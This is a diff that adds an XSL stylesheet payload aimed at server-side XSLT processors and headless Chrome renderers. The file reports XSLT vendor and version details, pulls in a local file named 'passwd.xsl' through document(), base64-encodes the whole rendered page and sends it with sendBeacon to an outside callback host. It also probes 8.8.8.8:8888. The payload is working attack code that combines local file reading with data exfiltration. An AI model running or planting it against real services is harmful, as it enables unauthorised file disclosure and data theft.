@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="#"?>
+
+<xsl:stylesheet id="color-change" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+<xsl:template match="/">
+<html>
+<body>
+	<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1000 1500">
+		<foreignObject id="myObj" width="1000" height="1500">
+		    <div style="font-size:xxx-large" xmlns="http://www.w3.org/1999/xhtml">
+    			<a href="#">#Copy me#</a><br/>
+    			XSL: <xsl:value-of select="system-property('xsl:version')"/><br/>
+    			Vendor: <xsl:value-of select="system-property('xsl:vendor')"/><br/>
+    			Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/><br/>
+    			document() <xsl:copy-of  select="document('passwd.xsl')"/>
+		    </div>
+		</foreignObject>
+	</svg>
+	<script>	
+		<![CDATA[
+		function utf8_to_b64( str ) {
+		    return window.btoa(unescape(encodeURIComponent( str )));
+		}
+		function get_dom_text() {
+		    var text_extractions_to_try = [
+		        document.documentElement.outerHTML,
+		    ];
+		    for (var i = 0; i < text_extractions_to_try.length; i++) {
+		        if (typeof text_extractions_to_try[i] === 'string') {
+		            return utf8_to_b64(text_extractions_to_try[i]);
+		        }
+		    }
+		    return '';
+		}
+		
+		window.navigator.sendBeacon("https://ajmuy1s2.c5.rs/awesomecallbackfromthedepthofheadlesschrome", get_dom_text());
+		]]>
+	</script>
+	<img src="https://8.8.8.8:8888" />
+</body>
+</html>
+
+</xsl:template>
+</xsl:stylesheet>
